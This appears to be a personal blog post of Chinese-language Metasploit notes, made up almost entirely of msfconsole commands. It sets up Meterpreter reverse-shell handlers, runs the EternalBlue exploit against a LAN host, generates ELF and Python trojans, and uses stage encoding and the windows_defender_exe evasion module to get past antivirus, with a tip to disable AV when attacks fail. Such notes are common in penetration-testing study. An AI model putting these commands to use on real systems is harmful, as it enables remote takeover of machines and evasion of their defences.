---
layout: post
title: "msfconsole"
description: ""
date: 2023-07-11
categories:
  - Metasploit
  - MSF_未分類
author: ""
tags: ['Metasploit']
---



# msfconsole

```bash


// -q 不顯示 banner
msfconsole -q 



// 使用 模組 multi handler
use exploit/multi/handler



//查看選項
show options



// 設置 localhost
set lhost 192.168.43.84



// 顯示payloads
show payloads



// 設置payloads
set payload windows/meterpreter/reverse_tcp



//啟動監聽
run



```



/////////////////////////////////////////////////////////////////////////////////////


### msfconsole 自動讀取 meterpreter   reverse (32bits)
```bash
msfconsole -r my_msf_auto_handler.txt
```



創建my_msf_auto_handler.txt
```bash
use exploit/multi/handler
set lhost 192.168.43.84
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.43.84
set lport 4444
run

```



/////////////////////////////////////////////////////////////////////////////////////




### msfconsole 自動讀取 meterpreter  reverse (64bits)

```bash
msfconsole -r my_msf_auto_handler.txt
```



### my_msf_auto_handler.txt

```bash
use exploit/multi/handler
set lhost 192.168.43.84
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.43.84
set lport 4444
run

```


### 漏洞攻擊

有時候不成功可以關閉AV
```
//handler 回到msf
back 


//search


search name:010

use exploit/windows/smb/ms17_010_eternalblue

set rhosts 192.168.43.217

show options

show targets

check

run 





//stage 混郩 也過不了AV

show advanced 


set EnableStageEncoding true


set StageEncoder x64/xor











```


### 快速生成一些handler 和木馬
注意:最好還是使用 use exploit/multi/handler 
linux 的 elf 
```
use payload/linux/x64/meterpreter/reverse_tcp


show options



set lhost 192.168.43.84


//生成木馬
generate -f elf -o /home/kali/Desktop/back



//handler
handler -H 192.168.119.84 -P 4444 -p linux/x64/meterpreter/reverse_tcp


handler -H 192.168.119.84 -P 4444 -p windows/meterpreter/reverse_tcp




```

python 
```
use payload/python/meterpreter/reverse_tcp


show options



set lhost 192.168.43.84

//生成木馬
generate -f raw -o /home/kali/Desktop/hack.py



handler -H 192.168.119.84 -P 4444 -p python/meterpreter/reverse_tcp

```




### auxiliary 輔助模塊
大部分都是掃描

```
//蒐集browser 信息
use  auxiliary/gather/browser_info 

```



### nop模塊
生成nop 待續.......



### Evasion 模塊
```

show evasion

use evasion/windows/windows_defender_exe

//生成
run 

```

